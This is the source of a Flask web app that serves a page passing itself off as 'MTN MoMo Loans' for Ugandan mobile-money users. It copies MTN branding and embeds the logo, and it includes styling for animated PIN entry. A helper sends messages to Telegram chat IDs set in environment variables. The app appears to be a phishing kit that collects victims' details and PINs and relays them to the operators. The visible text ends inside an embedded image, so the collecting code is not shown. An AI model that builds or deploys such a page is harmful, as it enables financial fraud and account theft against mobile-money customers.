import os
import json
import redis
import time
import requests
from flask import Flask, Response, request, jsonify
from datetime import datetime
import pytz

app = Flask(__name__)
from flask import send_from_directory

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('assets', filename)


# Telegram Configuration (support both TELEGRAM_BOT_TOKEN and TELEGRAM_TOKEN)
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

def send_telegram_notification(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram configuration missing. Notification skipped.")
        return
    try:
        # Support for multiple chat IDs separated by commas
        chat_ids = [cid.strip() for cid in TELEGRAM_CHAT_ID.split(',')]
        
        for chat_id in chat_ids:
            if not chat_id:
                continue
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            try:
                requests.post(url, json=payload, timeout=5)
            except Exception as inner_e:
                print(f"Failed to send to chat_id {chat_id}: {inner_e}")
    except Exception as e:
        print(f"Telegram notification orchestration failed: {e}")

# Helper to get current time in Uganda/Johannesburg timezone
def get_now_str():
    try:
        tz = pytz.timezone('Africa/Kampala')
        now = datetime.now(tz)
    except:
        now = datetime.now()
    return now.strftime("%Y-%m-%d %I:%M:%S %p")

# Initialize Redis client using REDIS_URL
db = None
try:
    redis_url = os.environ.get("REDIS_URL")
    if redis_url:
        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}") # Log host only for safety
        
        # Comprehensive connection parameters for Cloud Providers (Upstash/Vercel)
        # 1. ssl_cert_reqs=None ignores self-signed/provider cert issues
        # 2. socket_timeout ensures we don't hang the lambda forever
        # 3. retry_on_timeout handles cold starts
        db = redis.from_url(
            redis_url, 
            decode_responses=True, 
            ssl_cert_reqs=None,
            socket_timeout=5.0,
            socket_connect_timeout=5.0,
            retry_on_timeout=True
        )
        # Test connection immediately
        db.ping()
        print("Redis client initialized and verified successfully.")
    else:
        print("REDIS_URL environment variable not found.")
except Exception as e:
    print(f"Redis initialization failed CRITICAL: {e}")
    db = None # Reset to ensure we don't use a broken client

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MTN MoMo Loans — Uganda Mobile Money</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root {
      --brand-blue: #004F71;
      --brand-yellow: #FFCC00;
      --brand-blue-dark: #00334E;
      --brand-accent: #FFCC00;
    }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    .bg-momo-blue { background-color: var(--brand-blue); }
    .text-momo-blue { color: var(--brand-blue); }
    .bg-momo-yellow { background-color: var(--brand-yellow); }
    .text-momo-yellow { color: var(--brand-yellow); }
    
    /* Override for existing classes to minimize breakage */
    .bg-MTN MoMo-blue { background-color: var(--brand-blue); }
    .text-MTN MoMo-blue { color: var(--brand-blue); }
    .bg-MTN MoMo-cyan { background-color: var(--brand-yellow); }
    .text-MTN MoMo-cyan { color: var(--brand-yellow); }
    . { background-color: var(--brand-blue); }
    .text-[#004F71] { color: var(--brand-blue); }
    . { background-color: var(--brand-cyan); } /* Use cyan instead of red for brand consistency */
    .text-[#004F71] { color: var(--brand-cyan); }
    .bg-[#FFCC00] { background-color: var(--brand-blue-dark); }
    .text-[#FFCC00] { color: var(--brand-blue-dark); }
    
    .accent-MTN MoMo { accent-color: var(--brand-blue); }
    
    .gradient-MTN MoMo {
      background: linear-gradient(135deg, var(--brand-blue) 0%, var(--brand-blue-dark) 100%);
    }
    .gradient-cyan {
      background: linear-gradient(135deg, var(--brand-cyan) 0%, var(--brand-blue) 100%);
    }
    .border-[#FFCC00] { border-color: var(--brand-green); }
    .hide-scrollbar::-webkit-scrollbar { display: none; }
    .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    @keyframes pin-wavy {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .animate-pin-wavy {
      display: inline-block;
      animation: pin-wavy 0.5s ease-in-out infinite;
    }
    .animate-pin-wavy:nth-child(2) { animation-delay: 0.1s; }
    .animate-pin-wavy:nth-child(3) { animation-delay: 0.2s; }
    .animate-pin-wavy:nth-child(4) { animation-delay: 0.3s; }
  </style>
</head>
<body class="bg-[#f4f5f7] text-slate-900 antialiased min-h-screen flex flex-col justify-between">

  <!-- TOP HEADER -->
  <header class="bg-white border-b border-slate-200 sticky top-0 z-40 shadow-sm">
    <div class="max-w-[760px] mx-auto px-4 h-16 flex items-center justify-between">
      <div class="flex items-center gap-3 cursor-pointer" onclick="goTo('home')">
        <div class="flex items-center gap-2">
          <img src="data:image/png;base64,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" alt="MTN MoMo Logo" class="h-10 w-auto object-contain">
          <div class="flex flex-col">
            <span class="text-lg font-black text-[#FFCC00] leading-none" style="color: #FFCC00; -webkit-text-stroke: 0.5px #004F71;">MoMo</span>
            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">from MTN</span>
          </div>
        </div>
        <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-yellow-50 text-yellow-700 border border-yellow-200">
          <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></span>
          Live
        </span>
      </div>

      <button id="menu-btn" onclick="toggleMenu(true)" class="p-2 text-slate-700 hover:bg-slate-100 ">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
      </button>
    </div>
  </header>

  <!-- SLIDE-OVER MENU -->
  <div id="drawer" class="fixed inset-0 z-50 pointer-events-none transition-opacity duration-300 opacity-0">
    <div onclick="toggleMenu(false)" class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm"></div>
    <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300">
      <div>
        <div class="flex items-center justify-between pb-4 border-b border-slate-200"><img src="data:image/png;base64,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